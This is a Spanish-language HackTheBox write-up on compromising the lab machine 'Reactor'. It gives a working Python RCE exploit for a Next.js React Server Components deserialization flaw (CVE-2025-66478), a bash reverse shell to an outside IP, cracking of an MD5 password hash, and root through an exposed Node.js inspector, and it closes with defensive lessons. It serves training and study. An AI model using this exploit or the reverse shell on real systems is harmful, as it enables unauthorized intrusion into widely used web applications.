# Reactor — HackTheBox Writeup

| Campo         | Detalle                        |
|---------------|--------------------------------|
| **Máquina**   | Reactor                        |
| **OS**        | Linux                          |
| **IP**        | 10.129.245.214                 |
| **Dificultad**| Fácil                          |
| **Fecha**     | Junio 2026                     |

---

## Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración](#2-enumeración)
3. [Explotación — CVE-2025-66478 (RCE en Next.js)](#3-explotación--cve-2025-66478-rce-en-nextjs)
4. [Acceso inicial — shell como node](#4-acceso-inicial--shell-como-node)
5. [Escalada a engineer](#5-escalada-a-engineer)
6. [Escalada a root — Node.js Inspector](#6-escalada-a-root--nodejs-inspector)
7. [Flags](#7-flags)
8. [Lecciones aprendidas](#8-lecciones-aprendidas)

---

## 1. Reconocimiento

Escaneo completo de puertos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.245.214 -oG allPorts
```

**Puertos abiertos:**
- 22 — SSH
- 3000 — HTTP (Next.js)

Escaneo de versiones:

```bash
nmap -p22,3000 -sCV 10.129.245.214 -oN targeted
```

El puerto 3000 devuelve los siguientes headers relevantes:

```
X-Powered-By: Next.js
x-nextjs-cache: HIT
x-nextjs-prerender: 1
```

Confirma que se trata de una aplicación **Next.js** con App Router y React Server Components activos.

---

## 2. Enumeración

Se analiza el código fuente de la web. La aplicación se llama **ReactorWatch | Core Monitoring System** — un panel de monitorización de reactor nuclear.

Se intentó enumerar rutas con ffuf sin éxito — la app no tiene rutas accesibles directamente. Sin embargo, los headers de nmap revelan que usa Next.js con React Server Components (RSC), lo que la hace potencialmente vulnerable a **CVE-2025-66478**.

---

## 3. Explotación — CVE-2025-66478 (RCE en Next.js)

**CVE-2025-66478** es una vulnerabilidad crítica (CVSS 10.0) de **Remote Code Execution sin autenticación** en aplicaciones Next.js que usan el App Router con React Server Components.

El fallo reside en el protocolo "Flight" de RSC, que deserializa datos del cliente sin validación adecuada. Un payload malicioso puede inyectar claves como `__proto__` o `constructor` (Prototype Pollution), escalando hasta el `Function constructor` de JavaScript para ejecutar código arbitrario en el servidor.

Se desarrolla el siguiente exploit en Python:

```python
import requests
import json

url = "http://10.129.245.214:3000/"
EXECUTABLE = "id"

payload = json.dumps({
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}').toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
})

files = {
    "0": (None, payload),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}

res = requests.post(url, files=files, headers=headers)
print(res.status_code)
print(res.text[:1000])
```

El payload usa `process.mainModule.require` para acceder a `child_process` y fuerza la salida del comando en el digest del error HTTP, haciéndola visible en la respuesta.

Se confirma RCE con el comando `id`. Luego se lanza una reverse shell:

```bash
# Listener en Parrot
nc -lvnp 4444
```

Se cambia `EXECUTABLE` por:

```
bash -c 'bash -i >& /dev/tcp/10.10.17.118/4444 0>&1'
```

---

## 4. Acceso inicial — shell como node

Se recibe la conexión:

```
node@reactor:/opt/reactor-app$
```

Se estabiliza la shell:

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

---

## 5. Escalada a engineer

Se enumera el directorio de la app y se encuentra un archivo `.env` con la ruta de una base de datos SQLite:

```
DB_PATH=/opt/reactor-app/reactor.db
```

Se accede a la base de datos:

```bash
sqlite3 /opt/reactor-app/reactor.db
.tables
SELECT * FROM users;
```

Se obtiene un hash MD5 de la contraseña del usuario `engineer`. Se crackea el hash y se obtiene la contraseña en texto claro.

Se cambia al usuario engineer:

```bash
su engineer
```

Se encuentra la primera flag:

```bash
cat /home/engineer/user.txt
```

---

## 6. Escalada a root — Node.js Inspector

Se enumeran los procesos activos:

```bash
ps aux | grep root
```

Se detecta un proceso Node.js corriendo como root con el inspector activo:

```
root  1412  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

El flag `--inspect` expone un WebSocket de depuración en el puerto 9229 que permite ejecutar código JavaScript arbitrario en el contexto del proceso — en este caso, como **root**.

Se confirma que el inspector está activo:

```bash
curl -s http://127.0.0.1:9229/json
```

Se conecta al inspector directamente con Node.js:

```bash
node inspect 127.0.0.1:9229
```

Desde el REPL del inspector se ejecuta código como root:

```javascript
exec("cat /root/root.txt")
```

Se obtiene la flag de root.

---

## 7. Flags

```bash
# Flag de usuario
cat /home/engineer/user.txt

# Flag de root
cat /root/root.txt
```

---

## 8. Lecciones aprendidas

- **CVE-2025-66478**: las aplicaciones Next.js con App Router y RSC deben actualizarse a versiones parcheadas (15.0.5+). La deserialización insegura del protocolo Flight permite RCE sin autenticación con un único HTTP request.
- **Credenciales en bases de datos locales**: las contraseñas almacenadas con MD5 sin sal son trivialmente crackeables. Siempre usar bcrypt, argon2 o similar.
- **Node.js `--inspect` en producción**: nunca exponer el inspector de Node.js en producción. Si es necesario para debugging, restringirlo con autenticación y nunca correrlo como root.
- **Reutilización del mismo proceso privilegiado**: correr servicios de monitorización como root innecesariamente amplía la superficie de ataque. Aplicar el principio de mínimo privilegio.
